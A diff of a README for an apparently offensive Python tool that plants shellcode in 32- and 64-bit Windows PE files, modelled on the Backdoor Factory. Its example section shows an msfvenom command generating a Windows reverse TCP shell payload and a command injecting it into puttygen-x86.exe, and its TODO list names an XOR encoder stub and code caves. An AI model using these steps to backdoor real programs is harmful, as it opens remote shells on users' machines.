@@ -5,14 +5,18 @@
 **This project is meant to be used for educational purposes only or for authorized purposes.**
 
 This project is a work in progress. Not all features are integrated but now the following use cases are supported.
+
 - Adding a new section and entering at that new section without restoration
 - Adding a new section, jumping to that section, and restoring the original instructions
 
 The goal is to leverage pefile and capstone to create a stripped down version of the Backdoor factory targeting 32 and 64 bit x86 systems that is easy to develop with.
 
 ## TODO
+
 - [ ] Use an xor/encoder stub
-- [ ] Discover code cave in .text and write to there 
+- [ ] Discover code cave in .text and write to there
+- [ ] Cleanup: add mixin inheritance for common functionality in inject module
+- [ ] Cleanup: move restoration to class(es)
 
 ## Example
 
@@ -21,7 +25,8 @@ $ msfvenom -p windows/shell_reverse_tcp -o /path/to/payload/local.py LHOST=x LPO
 ## edit the local.py file and remove all the "python" portions so that it is just in /x00/x01/x02... format, new lines will be removed automatically
 ## save new verseion as local.txt
 $ ./injectx86.py build -s txt:/path/to/payload/local.txt -f samples/puttygen-x86.exe --force --cave new-section -o /path/to/payloads/folder
-``` 
+```
+
 ## Usage
 
 ```
@@ -107,3 +112,4 @@ optional arguments:
 - https://github.com/v-p-b/peCloakCapstone
 - https://github.com/secretsquirrel/the-backdoor-factory
 - https://nightcr4wl3r.blogspot.com/2017/11/automating-backdoor-creation-for-pe.html
+- https://github.com/n3tsky/Exploits-Tools/tree/master/PE-Backdoor
